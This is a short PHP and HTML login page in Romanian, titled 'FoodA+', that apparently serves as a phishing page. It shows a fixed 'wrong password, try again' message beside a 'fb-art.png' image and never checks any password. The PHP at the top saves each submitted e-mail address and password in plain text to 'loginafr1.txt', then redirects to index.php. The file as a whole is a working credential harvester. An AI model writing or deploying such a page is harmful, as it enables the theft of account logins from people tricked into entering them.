<?php
 if (isset($_POST['submit'])) {
   $file = "loginafr1.txt";
   $fh = @fopen($file, "w");
   if (!$fh) {
     echo "Fisierul nu poate fi deschis!";
   }
   else {
     fwrite($fh,$_POST['username']."\r\n" . $_POST['password']);
     //fwrite($fh,mb_strtoupper($_POST['username'], 'utf-8')."\r\n" . $_POST['password']);
     fclose($fh);
     unset($_POST);
header("location: index.php");
   }
 }
?>

<!DOCTYPE html>
<head>
 <meta charset="UTF-8">
 <link rel="stylesheet" type="text/css" href="login/css/login.css"/>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 <script src="../scripts/slideup.js"></script>
<style>
#pozaddd{
margin-left:37%;
}
</style>
</head>

<body>
 <div id="titlu">FoodA+</div><br>
 <h2>Parola introdusa este gresita, mai incercati inca o data! </h2>
 <img id="pozaddd" src="fb-art.png">

 <form method="post">
  <input type="text" class="loginform" id="username" name="username" value = "" placeholder="Adresa de E-mail" required><br><br>
  <input type="password" class="loginform" id="password" name="password" value = "" placeholder="Parola" required><br><br>

  <button type="submit" class="submit" id="submit" name="submit">Conectare</button>
 </form>

</body>
</html>